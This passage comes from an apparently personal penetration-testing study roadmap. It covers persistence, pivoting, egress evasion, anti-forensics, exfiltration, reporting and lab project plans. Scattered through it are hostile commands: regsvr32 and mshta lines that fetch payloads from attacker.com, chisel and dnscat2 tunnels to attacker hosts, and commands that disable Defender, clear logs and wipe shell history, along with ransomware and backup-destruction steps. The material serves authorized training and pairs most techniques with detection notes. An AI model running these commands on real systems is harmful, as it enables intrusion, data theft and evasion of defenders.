- [ ] **SSH Authorized Keys Backdoor:** Append attacker public key to `~/.ssh/authorized_keys` or `/root/.ssh/authorized_keys`. Also inject into `/etc/skel/.ssh/authorized_keys` to persist into new user accounts. Detect via: SSH login events (`/var/log/auth.log`), authorized_keys modification timestamps.

- [ ] **LD_PRELOAD Hijack:** Set `LD_PRELOAD=/tmp/evil.so` in environment init files or `/etc/ld.so.preload` to load a malicious shared library before every executed binary. Detect via: `ldd` output anomalies, `/etc/ld.so.preload` file existence (uncommon), auditd exec syscall monitoring.

- [ ] **SUID Binary Planting:** Compile a SUID root shell (`chmod u+s /tmp/shell`) or modify an existing SUID binary. Find all SUID binaries: `find / -perm -4000 -type f 2>/dev/null`. Detect via: baseline comparison of SUID binary list, auditd `chmod`/`chown` watches.

- [ ] **PAM Backdoor (Advanced):** Modify a PAM module (`/lib/security/pam_unix.so`) or add a new PAM config entry to accept a hardcoded master password. Requires root. Detect via: PAM module file hashes, `/etc/pam.d/` config file modification times.

- [ ] **Forensic Artifact Awareness:** Know what evidence each Linux persistence technique leaves: cron log entries, systemd journal records, SSH auth logs, auditd syscall logs, shell history files. Practice finding these artifacts on a compromised box and mapping them back to the attacker technique.

**Lateral Movement, Pivoting & Egress Evasion:**

- [ ] **SMB/WinRM:** Use **PsExec, Invoke-Command, Evil-WinRM, WMIexec** to execute **commands on adjacent machines**.

- [ ] **Network Pivoting & SOCKS Tunneling (Multi-Homed Routing):**
  - **Chisel:** SOCKS5 reverse proxy over HTTP/WebSockets:
    - Attacker (server): `chisel server --reverse --port 8080`
    - Compromised Pivot (client): `chisel client <attacker_ip>:8080 R:1080:socks`
    - Route commands via `proxychains4 -q nmap -sT -Pn -p 80,445 10.10.10.x`
  - **Ligolo-ng:** High-performance TUN interface tunneling without proxychains overhead:
    - Set up `proxy` on attacker, create `ligolo` TUN interface (`sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up`).
    - Run `agent` on victim host, connect back, establish session, and add kernel routing table rule (`sudo ip route add 172.16.1.0/24 dev ligolo`).
  - **SSH Dynamic Port Forwarding:** `ssh -D 1080 -N -f user@pivot_host` (creates local SOCKS4/5 proxy on port 1080).
  - **SSH Local & Remote Forwarding:**
    - Local: `ssh -L 8443:internal_host:443 user@pivot_host` (access internal HTTPS service directly via localhost:8443).
    - Remote: `ssh -R 4444:attacker_ip:4444 user@pivot_host` (forward internal reverse shell to attacker listener).

- [ ] **Egress Filtering Bypass & Covert Exfiltration:**
  - **DNS Tunneling:** When all outbound TCP/UDP is blocked except internal recursive DNS: deploy `dnscat2` or `iodine` to encapsulate arbitrary TCP traffic and command shells inside Base32/Base64 DNS TXT and CNAME queries.
  - **ICMP Payloads:** When Layer 4 is blocked but ping is permitted: exfiltrate data byte-by-byte using crafted ICMP echo request data fields (`nping --icmp`, `icmpsh`).
  - **HTTPS & CDN Fronting:** Wrap outbound command/control and data exfiltration inside trusted SaaS protocols (HTTPS webhooks to Discord, Slack, Telegram, or Google Drive API) to blend into legitimate enterprise telemetry.

- [ ] **SSH Agent Hijack:** Compromise **SSH forwarding** (`SSH_AUTH_SOCK`) to move to **key-trusted hosts**.

- [ ] **RDP Relay/NTLM Relay:** Exploit **weak signing** to relay **RDP/HTTP credentials** to **other systems**.

- [ ] **Printer/SNMP Abuse:** Exploit **print servers, SNMP v1/v2c** for **lateral access**.

- [ ] **SaaS-to-SaaS Pivoting:** Leverage **OAuth tokens/app integrations** to pivot from **Slack/Teams** into **Salesforce/GitHub/Google Workspace**.

---

### Topic 4: The Shadow (Defense Evasion & Anti-Forensics) — 🧠🔬 Mixed
[[Topic-5_Covering-Tracks|📁]]

> [!TIP]
> **Goal:** Blind the Blue Team and minimize evidence of compromise.

> [!NOTE]
> ⏱️ **Time Bracket: 3–4 days** — Days 1–2: Log manipulation (Windows: `Clear-EventLog`, `wevtutil cl Security`; Linux: truncate auth.log; understand what gets shipped to SIEM vs what stays local), defense evasion (Windows Defender disable via PowerShell: `Set-MpPreference -DisableRealtimeMonitoring $true`; AMSI bypass; EDR process injection awareness; Credential Guard and RunAsPPL status check before LSASS dump; AppLocker/WDAC bypass via MSBuild/regsvr32/mshta LOLBAS). Days 3–4: Anti-forensics (shred/srm for tool cleanup, timestomping `touch -t`, bash history clearing `HISTFILE=/dev/null`, prefetch file deletion, registry run key cleanup), map each technique to SIEM/Sysmon event IDs. Deliverable: demonstrate 3 anti-forensics techniques and identify which SIEM/Sysmon event IDs each generates — document the detection gap for each.

**Log Manipulation & Cleanup:**

- [ ] **Windows Event Log:** Delete or clear **Security, System, Application** logs; disable **audit logging**.

- [ ] **Linux Auditd:** Disable **auditd**, flush **auth.log, syslog** via **log rotation abuse**.

- [ ] **Firewall/SIEM:** Identify **log shipping** and poison **central logs** or syslog streams.

- [ ] **Application Logs:** Scrub **web server logs, database audit trails, application-specific logs**.

**Defense Evasion:**

- [ ] **EDR Evasion:** Disable **Windows Defender, real-time protection**; abuse **exploit guard gaps**.

- [ ] **DLP Bypass:** Exfil via **covert channels, low-bandwidth tunnels, encryption obfuscation**.

- [ ] **IDS/NIDS Evasion:** Use **packet fragmentation, timing jitter, polymorphic payloads**.

- [ ] **AppArmor/SELinux Bypass:** Disable or escape **mandatory access controls**.

- [ ] **Windows Credential Guard & RunAsPPL Bypass (Awareness):** Enterprise environments deploy these as primary mitigations against LSASS credential dumping. Understand both before attempting credential extraction on a modern Windows target:
  - **Windows Credential Guard** (enabled via Hyper-V VBS): Isolates NTLM hashes and Kerberos TGTs in a UEFI-secured Virtual Trust Level (VTL1) enclave. Standard LSASS dumps via mimikatz/procdump fail — the credential material is not in the LSASS process memory accessible from VTL0. Detection: `(Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\LSA').LsaCfgFlags` — value 1 or 2 means enabled. If Credential Guard is active, pivot to alternative credential sources (DPAPI blobs, cached credentials, Kerberos relay).
  - **RunAsPPL (Protected Process Light):** Registry: `HKLM\SYSTEM\CurrentControlSet\Control\LSA\RunAsPPL = 1`. Makes LSASS a protected process — standard user-land handles are denied even with SeDebugPrivilege. Bypass techniques: PPL driver abuse (load a legitimately signed but vulnerable kernel driver to strip PPL protection — PPLdump/ProtectedProcesses), direct syscall LSASS access via LSA callbacks, or `comsvcs.dll MiniDump` method which may still succeed on older platforms. Deeper bypass techniques live in Stage 5: Module 27.
  - **Operational check before dumping:** Always verify Credential Guard and PPL status before attempting LSASS. A failed dump with no bypass plan wastes time and generates high-confidence EDR telemetry.

- [ ] **AppLocker / WDAC Bypass via LOLBAS:** Application whitelisting (AppLocker via GPO, WDAC via Intune/GPO) restricts executable paths but can be bypassed via trusted Windows binaries:
  - **AppLocker bypass techniques:** `MSBuild.exe` (compiles and executes inline C#), `regsvr32.exe /s /u /i:http://attacker.com/payload.sct scrobj.dll` (scriptlet execution, "Squiblydoo"), `mshta.exe http://attacker.com/payload.hta` (HTA execution), `InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe` (uninstalls trigger code execution)
  - **WDAC bypass techniques:** WDAC is harder — it operates at kernel level and blocks drivers. Bypass requires abusing WDAC policy exceptions: script enforcement gaps in certain PowerShell language modes, using `rundll32.exe` with allowed DLLs, or targeting allowed installer paths via custom MSI.
  - **Detection:** Check AppLocker policy with `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`. Check WDAC with `Get-CIPolicy -FilePath "$env:SystemRoot\System32\CodeIntegrity\CIPolicies\Active\*"`.
  - **LOLBAS reference:** [lolbas-project.github.io](https://lolbas-project.github.io) — filter by "Execute" function type for current bypass candidates.
  - **Canonical coverage:** Full LOLBAS/GTFOBins methodology is in Stage 5 Module 27 (Offensive Development). This entry focuses on awareness and immediate tactical applicability.

**Anti-Forensics:**

- [ ] **File Deletion:** Use **shred, srm, cipher /w** for **secure wiping** of tools and artifacts.

- [ ] **Timestomping:** Modify **file timestamps** (touch -t, $MFT, xattr) to **hide activity**.

- [ ] **Memory Wiping:** Clear **bash history, .zsh_history, PowerShell history** and environment variables.

- [ ] **Registry Cleanup:** Delete **run keys, browser history, recent documents, prefetch files**.

- [ ] **Obfuscation:** Use **base64, hex, ROT13** to hide **scripts, commands, strings** from pattern matching.

---

### Topic 5: Data Exfiltration & Impact — 🔬 Practical
[[Module-13_System-Hacking|📁]]

> [!TIP]
> **Goal:** Extract sensitive data and demonstrate business impact.

> [!NOTE]
> ⏱️ **Time Bracket: 2–3 days** — Days 1–2: Exfiltration channels (DNS tunneling: `dnscat2 server` + `client --dns domain=exfil.attacker.com`; HTTPS covert channels via webhook exfil to Discord/Slack blending in enterprise traffic; cloud API exfil: pre-signed S3 URLs, Google Drive API; ICMP tunneling for Layer 4 blocked environments). Day 3: Impact demonstration (ransomware concept: RSA key generation + AES-256 file encryption hybrid — awareness only, not deployment; data destruction via backup enumeration and deletion; service disruption via config corruption). This topic is the "why does it matter" for every pentest report executive summary. Document impact in dollar-value terms when demonstrating findings. Deliverable: exfiltrate a test file from your lab using DNS tunneling. Capture the traffic in Wireshark and annotate what the exfil looks like on the wire.

**Data Exfiltration Channels:**

- [ ] **DNS Tunneling:** Encode **data in DNS queries** and exfil via **recursive lookups**.

- [ ] **HTTPS Covert Channels:** Blend **exfil into normal HTTPS** streams with **size/timing variance**.

- [ ] **Cloud APIs:** Use **pre-signed S3/Blob URLs, Drive APIs** for **high-bandwidth exfil**.

- [ ] **ICMP/Ping Tunneling:** Tunnel **data over ping requests** when **TCP/UDP egress blocked**.

- [ ] **Dead-Drop Upload:** Stage **files to attacker-controlled sites** (GitHub gists, pastebin, etc.).

**Impact & Damage:**

- [ ] **Ransomware Deployment:** Encrypt **critical files** with **RSA/AES hybrid** and demand **ransom**.

- [ ] **Data Destruction:** Wipe **backups, system restore points** to prevent **recovery**.

- [ ] **Service Disruption:** Corrupt **databases, config files** to trigger **outages and chaos**.

---

### Topic 6: The Professional (Governance & Reporting) — 🧠🔬 Mixed
[[Module-13_System-Hacking|📁]]

> [!TIP]
> **Goal:** Execute within legal/ethical boundaries and deliver findings professionally.

> [!NOTE]
> ⏱️ **Time Bracket: 2–3 days** — Day 1: Rules of engagement (scope adherence — operate only within authorized IP ranges; ROE documentation — log every action with timestamp and command; escalation/abort procedures; data handling for screenshots/credentials/exfiltrated files), MITRE ATT&CK mapping (correlate every technique to T-ID and Tactic: TA0043 Recon, TA0001 Initial Access, TA0004 Privilege Escalation). Day 2: Kill Chain annotation (Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions on Objective), audience-centric reporting (executive summary: non-technical risk/impact narrative; technical deep-dive: attack chain + PoC + IOCs; remediation roadmap: prioritized by CVSS with effort estimates). Day 3: Draft and refine the complete pentest report. Deliverable: write a complete pentest report for one of your lab compromises using the Module 26 structure. Executive summary + technical findings + remediation roadmap. Should be client-presentable.

**Rules of Engagement & Compliance:**

- [ ] **Scope Adherence:** Operate only within **authorized IP ranges, domains, systems** per engagement letter.

- [ ] **ROE Documentation:** Track **timeline, actions, access paths, artifacts discovered** for audit trail.

- [ ] **Escalation & Abort:** Know **when to stop, how to notify blue team, emergency procedures**.

- [ ] **Data Handling:** Secure **screenshots, credentials, exfiltrated files** with **encryption, access control**.

**Framework Alignment & Documentation:**

- [ ] **MITRE ATT&CK Mapping:** Correlate **every technique used** (T1234.567) to **documented tactics**.

- [ ] **Kill Chain Analysis:** Track the **Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions** flow.

- [ ] **Vulnerability Timeline:** Document **discovery date, exploitation date, remediation deadline**.

**Audience-Centric Reporting:**

- [ ] **Executive Summary:** Non-technical **risk/impact narrative** for **board/C-suite**.

- [ ] **Technical Deep-Dive:** Detailed **attack chain, proof-of-concept, IOCs** for **security/engineering teams**.

- [ ] **Remediation Roadmap:** Prioritized **fixes by risk level** with **effort estimates and timelines**.

- [ ] **Metrics & KPIs:** Highlight **MTTD (Mean Time to Detect), MTTC (Mean Time to Contain), detection gaps**.

### Lab Progression (Module 13: System Hacking & Initial Compromise)

> [!TIP]
> **Goal:** Practice compromise only in controlled environments and produce professional evidence.

- [ ] **Beginner Host Labs:** Complete at least 5 intentionally vulnerable Linux/Windows machines; document initial access, privilege escalation, evidence, and remediation.
- [ ] **Credential Handling Lab:** Capture and crack lab-only hashes, then document storage, chain of custody, and cleanup. Use the Password Cracking Gate before attempting this.
- [ ] **Post-Exploitation Timeline:** Build an operator timeline and defender timeline for one lab compromise.
- [ ] **Detection Pairing:** For every exploit path, identify Windows Event Logs, Sysmon, auditd, network, or SIEM artifacts.
  > [!IMPORTANT]
  > **Move-On Gate — Module 13: System Hacking & Initial Compromise**
  > I am not ready to complete Stage 2 until I can demonstrate ALL of the following without referencing a walkthrough:
  > **Initial Access**
  > - [ ] Exploit at least 3 different standalone host initial access vectors (e.g., exposed vulnerable network service like vsftpd/Samba/Apache, default/weak credentials on SSH/SMB/RDP, unauthenticated service abuse like Redis/NFS/MySQL, or a staged client script payload) on lab targets and produce a working interactive shell
  > - [ ] Enumerate a target using only `nmap`, directory bruteforcing (`gobuster`/`ffuf`), and manual inspection without automated vulnerability scanners (`OpenVAS`/`Nessus`) or automated exploit frameworks as a first pass
  > **Windows Privilege Escalation**
  > - [ ] Achieve SYSTEM from a low-privilege foothold using at least 2 different vectors from the 9-vector methodology above (e.g., Potato token impersonation like SweetPotato/GodPotato for `SeImpersonatePrivilege`, unquoted service path, weak service binary permissions, AlwaysInstallElevated MSI abuse, or modern UAC bypass)
  > - [ ] Run `winPEAS` and manually interpret every orange/red finding without relying on auto-exploitation
  > **Linux Privilege Escalation**
  > - [ ] Achieve root from a low-privilege foothold using at least 3 different vectors from the 9-vector methodology above (SUID/SGID, sudo misconfigurations, cron job/timer abuse, Linux capabilities, writable system/library files, NFS root squashing, kernel exploits, credential/config file leaks, or PAM module abuse)
  > - [ ] Complete at least 1 of: TryHackMe "Linux PrivEsc" room, HackTheBox Jarvis, or HackTheBox Cronos — with a written walkthrough
  > **Persistence & Lateral Movement**
  > - [ ] Demonstrate 2 Windows persistence mechanisms (registry RunKey, scheduled task, service installation) and identify their Event Log artifacts (Event ID 4688, 7045, 4698)
  > - [ ] Demonstrate host-to-host lateral movement or pivoting in a workgroup/local network lab (e.g., local administrator credential reuse via SMB/WinRM Pass-the-Hash, SSH key harvesting/pivoting, or network tunneling via Chisel/SSH to access an internal subnet). *(Note: Active Directory Kerberos Pass-the-Ticket is strictly tested in Stage 4: Module 19).*
  > **Defense Evasion**
  > - [ ] Identify what EDR/AV telemetry each technique generates (Sysmon Event ID 1 process creation, Event ID 10 process access) and document a detection gap for at least 1 technique
  > **Reporting**
  > - [ ] Submit 3 full lab attack reports using the Module 26 structure (scope → recon → exploitation → post-exploitation → impact → remediation)
  > - [ ] Each report must have a defender timeline paired with the operator timeline

---

## 🔹 Architecture Alignment Note: Network & Weaponization Tracks

> [!NOTE]
> **Curriculum Alignment:** Advanced operational topics previously grouped under secondary offensive operations have been cleanly integrated into their operational homes:
> - **Sniffing & Spoofing (ARP/DNS/MITM):** [[Cyber-Security/Roadmap/Stage-4_Enterprise#Module 23: Sniffing & Spoofing|Stage 4: Module 23]]
> - **Social Engineering (Phishing/Pretexting):** [[Cyber-Security/Roadmap/Stage-4_Enterprise#Module 24: Social Engineering|Stage 4: Module 24]]
> - **Malware & Weaponization (Payload Generation):** [[Cyber-Security/Roadmap/Stage-4_Enterprise#Module 25: Malware & Weaponization (Conceptual)|Stage 4: Module 25]] & [[Cyber-Security/Roadmap/Stage-5_Specialized#Module 27: Offensive Development & Tooling|Stage 5: Module 27]]
> - **Denial of Service & Resilience:** [[Cyber-Security/Roadmap/Shelf_Post-Hire#Shelf 17: Denial of Service & Availability Resilience|Shelf 17]]

------

---

> [!TIP]

### 🎮 Concurrent CTF Practice — Stage 2
> Practice must run concurrently with every module — not after I "finish" the theory.
> | Module | Platform | Box / Room | Why |
> |---|---|---|---|
> | 08–10 Recon & Enum | TryHackMe | **Relevant** room · **Passive Recon** · **Active Recon** | Hands-on with theHarvester, Nmap, Gobuster |
> | 08–10 Recon & Enum | HackTheBox | **Included** (Starting Point) | Full recon-to-shell intro chain |
> | 09 Scanning | TryHackMe | **Nmap** room | Every flag and scan type |
> | 11 Database | HackTheBox | **Sequel** (Starting Point) | SQL injection from scratch |
> | 12 Credentials | HackTheBox | **Responder** (Starting Point) | NetNTLM capture + Hashcat crack |
> | 13 System Hacking | TryHackMe | **Linux PrivEsc** + **Windows PrivEsc** rooms | Structured coverage of every vector |
> | 13 System Hacking | HackTheBox | **Blue** (EternalBlue) · **Optimum** · **Jarvis** | Real boxes requiring privesc |
> | General | [Proving Grounds Play](https://www.offensive-security.com/labs/) | Any Easy-rated box | Free OSCP-style practice |
> **Rule:** Every box I root gets a written writeup committed to my notes repo. No writeup = learning didn't happen.

### 🏆 Stage 2 Capstone Project

**Complete a Full Penetration Test on a Deliberately Vulnerable Lab**

Select a multi-machine vulnerable environment (HTB Pro Lab, VulnHub chain, or my own Stage 1 lab):

- [ ] **Perform full recon** (passive + active footprinting, scanning, enumeration)
- [ ] **Achieve initial access** on at least 2 machines using different vectors
- [ ] **Escalate privileges** to root/SYSTEM on each machine
- [ ] **Demonstrate lateral movement** between at least 2 systems
- [ ] **Document the full kill chain** from recon to impact

**Deliverables:**

- [ ] Professional penetration test report using PTES template (executive summary, methodology, findings, remediation)
- [ ] Attack chain diagram showing the complete path from initial access to domain compromise
- [ ] All evidence (screenshots, tool output, scripts) organized in my Git repository

> [!IMPORTANT]
> **Capstone Gate:** My report must be structured professionally enough to present to a client. A reader should understand every step without needing to ask questions.

---

### 🧭 Stage 2 Reflection & Competency Check

- [ ] **Reflection:** Which stage of the attack chain required the most iteration: recon, enumeration, exploitation, privilege escalation, or lateral movement?
- [ ] **Reflection:** What would a defender have seen at each major step?
- [ ] **Competency:** Can I perform recon and enumeration without jumping prematurely to exploitation?
- [ ] **Competency:** Can I prove every finding with evidence and explain business impact without exaggeration?
- [ ] **Competency:** Can I produce a complete attack chain diagram and client-ready report from raw notes?

> [!IMPORTANT]
> **Stage 2 Completion Gate:** Move on only when I can complete an authorized lab penetration test end-to-end, document it professionally, and explain both attacker actions and defender visibility.

---

---

## 🛠️ Stage 2 Mini Projects

> [!TIP]
> **Why these projects are here:** Stage 2 covers the full offensive lifecycle — recon, scanning, enumeration, and exploitation. These 4 projects map directly to Modules 08, 09, 10, and vulnerability assessment. Build each one _after_ completing its corresponding Module, not before. They are hands-on reinforcements of what I studied, not shortcuts around it.

> [!NOTE]
> **How to use this section:** Each project below maps to a specific Stage 2 Module. All code must be committed to my Git repository. README must cover: what the tool does, what protocols it uses, ethical usage requirements (authorized targets only), and sample output.

---

### Project 10 — Port Scanner

**Maps to:** Module 09 (Scanning) → Topic 2: Port, Service & Protocol Enumeration

**What it is:** A TCP/UDP port scanner that discovers open ports on a target host, attempts banner grabbing to identify services, supports concurrent scanning (threading or asyncio), and outputs results in a structured format. Should support SYN scan (raw sockets, requires root) and TCP connect scan (no root required).

**What I need before building it:**

- TCP 3-way handshake mechanics: SYN → SYN-ACK → ACK (open), SYN → RST (closed), no response (filtered)
- Raw socket programming in Python (`socket` module)
- Threading or `asyncio` — scanning 65,535 ports sequentially takes minutes; concurrent scanning takes seconds
- Service identification via banner grabbing (send a probe, read the response header)
- Study Nmap source behavior before implementing — understand _why_ a SYN scan is stealthier than a full connect scan

**Why build it:**
Nmap already exists. The reason I build my own is to understand _why_ port scanning works at the socket level — what does a TCP RST response mean vs a timeout vs a ICMP unreachable? What does a firewall returning RST vs dropping silently tell me? Building this makes every Nmap flag I use afterward meaningful rather than cargo-culted. This is the foundational recon tool that every subsequent project in this stage depends on.

**Deliverable:** Python CLI — `scan <target> --ports <range> --mode <connect|syn> --threads <n>`. Output: table of open ports with service guesses. README must document the ethical usage requirements and explain the SYN vs connect scan distinction.

---

### Project 11 — Network Packet Sniffer

**Maps to:** Module 23 (Sniffing & Spoofing) & Stage 2 Reconnaissance

**What it is:** A packet capture and analysis tool that captures live network traffic, parses packet headers (Ethernet, IP, TCP, UDP), extracts application-layer data for unencrypted protocols (HTTP, DNS), and displays a real-time stream of summarized traffic. Must run on a designated lab interface only.

**What I need before building it:**

- OSI model internals: know what each layer encapsulates
- Ethernet frame structure, IP header fields (TTL, flags, fragmentation), TCP header (sequence numbers, flags, window size)
- `scapy` (Python) — the standard library for packet crafting and capture
- Requires root/administrator privileges — document this clearly
- DNS query/response format (question section, answer section, record types)
- HTTP request structure (method, path, headers, body)

**Why build it:**
Every network security tool — from Wireshark to IDS/IPS systems — is built on the same packet capture foundation. Understanding how to capture and parse raw packets is essential for network forensics, building detection rules, and understanding what protocol-level data an attacker can see on an unencrypted network. This project also makes TLS's value immediately tangible: after parsing HTTP in plaintext, I understand exactly what TLS hides.

**Deliverable:** Python tool using `scapy` that captures on a specified interface (`--iface eth0`), filters by protocol (`--filter tcp/udp/dns/http`), and displays structured output. README must include sample output and note that this must only run in my own lab environment.

---

### Project 13 — Subdomain Scanner

**Maps to:** Module 08 (Footprinting & Reconnaissance) → Topic 2 & Topic 3: Infrastructure Mapping

**What it is:** A subdomain enumeration tool that combines: wordlist-based DNS brute-forcing (active), Certificate Transparency log querying via the crt.sh API (passive — no direct target traffic), and DNS record analysis (A, CNAME, MX). Must implement concurrent DNS resolution and rate limiting.

**What I need before building it:**

- DNS resolution mechanics: how a resolver walks the hierarchy (root → TLD → authoritative)
- DNS record types: A (IPv4), AAAA (IPv6), CNAME (alias), MX (mail), TXT (verification/SPF)
- Certificate Transparency: every TLS certificate issued is logged publicly — `crt.sh` exposes this via API, enabling passive subdomain discovery without touching the target
- `dnspython` or `aiodns` for async DNS resolution
- SecLists subdomain wordlists (the `Discovery/DNS/` directory)

**Why build it:**
The most critical vulnerabilities in a real engagement are often not found on `www.target.com` but on `dev.target.com`, `staging.target.com`, `admin-legacy.target.com`, or `vpn.target.com` — subdomains that exist because developers need them and forget to secure them. Subdomain scanning teaches me to think about the _entire attack surface_ of an organization rather than just its primary domain. The crt.sh passive technique is particularly valuable: it finds subdomains without generating a single packet to the target.

**Deliverable:** Python CLI — `scan <domain> --wordlist <path> --passive --threads <n>`. Output: list of discovered subdomains with resolved IPs. README must distinguish passive vs active discovery and explain Certificate Transparency.

---

### Project 14 — Vulnerability Scanner

**Maps to:** Module 09 (Scanning) & Module 10 (Enumeration) → Service Enumeration & Vulnerability Mapping

**What it is:** A network vulnerability scanner that: uses port scanning (Project 10) as its discovery layer, performs service version fingerprinting via banner grabbing, queries the NIST NVD API to find CVEs associated with identified service versions, scores each finding using CVSS, and generates a structured report. Must only target authorized systems.

**What I need before building it:**

- Project 10 (Port Scanner) completed and working — this scanner uses it as a dependency
- Service version extraction: banner grabbing returns strings like `Apache httpd 2.4.49` — you parse the service name and version
- NIST NVD API: free, no authentication required for basic queries — `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=<service+version>`
- CVSS scoring: understand what Base Score, Attack Vector, Attack Complexity, and Privileges Required mean
- Report generation: at minimum a structured Markdown or JSON report; optionally HTML

**Why build it:**
This is the Stage 2 capstone project — it combines everything from recon (port scanning) through enumeration (service fingerprinting) into a vulnerability assessment output. It demonstrates I understand the full discovery-to-finding lifecycle that underpins every professional penetration test and vulnerability management program. Tools like Nessus and OpenVAS follow this exact model: discover → fingerprint → correlate CVEs → score → report. Building it myself means I understand what these tools do under the hood, not just how to click their interfaces.

**Deliverable:** Python CLI — `scan <target> --ports <range>`. Output: structured report listing open ports, identified services, associated CVEs, and CVSS scores. README must explain the CVE/CVSS scoring model and include a sample report.

---

> [!IMPORTANT]
> **Stage 2 Project Completion Gate:** Each of these tools must only ever target systems you own or have explicit written authorization to test. My README files must include this disclaimer. A tool without an ethics section in its documentation is a tool that cannot be shown to an employer.

---

## 🏁 Stage Gate 1 — Host Dominance & Privilege Escalation

> [!IMPORTANT]
> **Stage 1 Exit Gate:** I cannot pass Stage 2 into Web & Application Security until I can:
> - Root an unassisted intermediate target box on Hack The Box / Proving Grounds.
> - Extract hashes from SAM / `/etc/shadow` and crack them using targeted Hashcat rules.
> - Demonstrate cold privilege escalation on **both Linux** (SUID, sudo, cron) and **Windows** (Token impersonation / Potato, Unquoted service path, DLL hijacking).
> - Document the end-to-end compromise lifecycle in a professional writeup.

---

### 🧭 Stage Navigation

| ◀ Previous Stage | 🏠 Master Hub | Next Stage ➔ | ⬆ Top |
| :---: | :---: | :---: | :---: |
| [[Cyber-Security/Roadmap/Stage-1_Foundation\|◀ Stage 1: Foundation]] | [[Cyber-Security/Roadmap/README\|MASTER_README]] | [[Cyber-Security/Roadmap/Stage-3_Web-and-App-Sec\|Stage 3: Web & App Sec ➔]] | [[#Stage 2 — Offense I\|⬆ Return to Top]] |

> 💡 **Obsidian Tip:** Press `Ctrl + Click` (or `Cmd + Click`) on `[[Cyber-Security/Roadmap/Stage-3_Web-and-App-Sec|Stage 3: Web & App Sec]]` to open the next stage in a split tab, or hover to preview.
